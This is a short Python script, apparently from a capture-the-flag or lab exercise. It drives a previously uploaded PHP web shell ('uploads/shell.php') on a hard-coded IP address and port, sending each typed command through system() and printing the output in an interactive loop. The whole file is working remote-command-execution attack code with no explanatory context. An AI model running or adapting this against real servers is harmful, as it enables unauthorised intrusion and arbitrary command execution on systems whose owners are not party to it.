import requests


def EXP(url):
    img_path = "uploads/shell.php"
    cmd = "whoami"
    while cmd != "exit":
        payload = {
            'cmd':'system("{}");'.format(cmd)
        }
        res = requests.post(url+img_path, data=payload)
        print(res.text)
        cmd = input("cmd>>>")

if __name__ == '__main__':
    url = "http://120.25.24.45:30522"
    EXP(url)
